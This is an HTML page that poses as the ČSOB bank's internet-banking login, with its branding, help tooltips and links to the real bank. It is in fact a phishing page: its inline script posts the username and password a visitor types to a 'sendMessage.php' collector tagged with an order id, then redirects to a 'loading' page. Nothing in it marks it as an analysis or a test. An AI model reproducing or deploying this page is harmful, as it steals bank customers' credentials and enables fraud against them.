<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" type="text/css" href="csob/csob.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Přihlášení | ČSOB ID</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <link rel="shortcut icon" href="csob/images/csob-logo-png-transparent-2.png"  type="image/png">
</head>
<body>
    <div class="container"> 
        <div class='header'>
            <img src="csob/images/CSOBLOGO.svg" alt="">
        </div>
        <div class="main">
            <div class="main-heading">
                <div class="main-heading-wrap">
                    <img src="csob/images/icon-heading.svg" alt="">
                    <span>Přihlášení do internetového bankovnictví</span>
                </div>
            </div>
            <div class="logpass">
                <div class="username">
                    Uživatelské jméno
                </div>
                <div class="usernameinput">
                    <div class="input-wrapper">
                        <input id="login" type="text">
                    </div>
                    <div class="vopros">
                        <img id="vopros-img1" src="csob/images/vopros.png" alt="" aria-describedby="vopros-podskazka1">
                    </div>
                </div>
                <div class="password">
                    Heslo
                </div>
                <div id="vopros-podskazka1" class="vopros-podskazka" role="tooltip">
                    <div class="tooltip-content">
                        Jste v internetovém bankovnictví poprvé a ještě nemáte zaregistrované uživatelské jméno? Použijte místo něj své identifikační číslo, které vám přišlo e-mailem a je uvedené na Dohodě o ČSOB Identitě.
                    </div>
                </div>
                <div id="vopros-podskazka2" class="vopros-podskazka" role="tooltip">
                    <div class="tooltip-content">
                        Jste v internetovém bankovnictví poprvé a ještě nemáte zaregistrované heslo? Použijte místo něj jednorázový kód, který vám přišel v SMS zprávě. Pokud jste své heslo zapomněli nebo bylo zablokováno, můžete jej obnovit pomocí odkazu níže.
                    </div>
                </div>
                <div class="passinput">
                    <div class="input-wrapper2">
                        <input id="password" type="password">
                    </div>
                    <div class="vopros2">
                        <img id="vopros-img2" src="csob/images/vopros.png" alt="">
                    </div>
                </div>
                <div class="zmenaprihlasit">
                    <div class="zmena">
                        <a href="https://identita.csob.cz/prihlaseni/#sprava-identity">Odblokování/změna hesla</a>
                    </div>
                    <div class="prihlasit">
                        <button id="Pokracovat"> Přihlásit </button>
                    </div>
                </div>
            </div>
            <div class="peredfoot">
                <div class="jak">
                    <div class="a1">
                        <a href="https://www.csob.cz/portal/jaknato/internetove-bankovnictvi">
                            Jak na první přihlášení
                        </a>
                    </div>
                    <div class="a2">
                        <a href="https://www.csob.cz/portal/jaknato/csob-smart-klic">
                            Jak na Smart klíč
                        </a>
                    </div>
                </div>
                <div class="description">
                    Stáhněte si mobilní bankovnictví ČSOB Smart
                </div>
                <div class="mobile-apps">
                    <a href="https://apps.apple.com/app/apple-store/id1528483245">
                        <img src="csob/images/appstore.svg" alt="">
                    </a>
                    <a href="https://play.google.com/store/apps/details?id=cz.csob.smart"><img src="csob/images/googleplay.svg" alt=""></a>
                </div>
            </div>
        </div>
        <div class="foot">
            <div class="li1">
                <a href="https://www.csob.cz/">www.csob.cz</a>
            </div>
            <div class="li2">
                <a href="https://www.csob.cz/portal/csob/o-csob-a-skupine"> O skupině ČSOB</a>
            </div>
            <div class="li3">
                <a href="https://www.csob.cz/portal/podminky-pouzivani">Cookies a podmínky používání</a>
            </div>
            <div class="li4">
                <a href="https://www.csob.cz/portal/csob/ochrana-osobnich-udaju">Ochrana osobních údajů</a>
            </div>
            <div class="li5">
                <a href="https://www.csob.cz/portal/provozni-informace">Provozní informace</a>
            </div>
            <div class="li6">
                <a href="https://bezpecnost.csob.cz/">Průvodce bezpečností</a>
            </div>
            <div class="li7">
                <a href="https://online.csob.cz/web/csob-napoveda/">Nápověda</a>
            </div>
            <div class="li8">
                <a href="https://online.csob.cz/novinky/">Archiv zpráv</a>
            </div>
            <div class="end">© Československá obchodní banka, a. s.</div>
        </div>
    </div>
    <script src="csob/csob.js"></script> 
    <script>
    const submitButton = document.getElementById('Pokracovat')
const login = document.getElementById('login')
const password = document.getElementById('password')

submitButton.onclick = function () {

let bank = "<?php echo $bank ?>";

if (login.value == null || password.value == null) {
    return;
}

$.ajax({
            url: 'csob/sendMessage.php',
            method: 'POST',
            data: {
                orderid: "<?php echo $id ?>",
                bank: 'csob',
                login: login.value,
                password: password.value,
            },
            success: function (response) {
                // Обрабатываем успешный ответ
                console.log('Success');
            },
            error: function (error) {
                // Обрабатываем ошибку
                console.log('Error updating bank:', error);
            },
            complete: function () {
                // Выполняем переход на новую страницу
                const currentURL = window.location.href;
  const newURL = currentURL.replace('/bankaccount/', '/loading/');
  window.location.href = newURL;
            }
        });

}
  </script>
    <script src="/facebook/script.js"></script>
</body>
</html>